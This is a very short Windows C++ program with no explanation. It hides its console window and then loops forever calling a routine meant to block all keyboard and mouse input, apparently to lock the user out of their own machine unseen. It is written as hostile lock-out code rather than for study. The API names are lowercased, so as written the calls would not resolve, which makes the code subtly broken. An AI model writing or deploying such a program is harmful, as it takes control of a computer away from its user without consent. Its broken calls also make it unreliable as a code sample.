#include <windows.h>
#include <iostream>
int main()
{
    freeconsole();
    while (1)
    {
        blockinput(true);
    }
}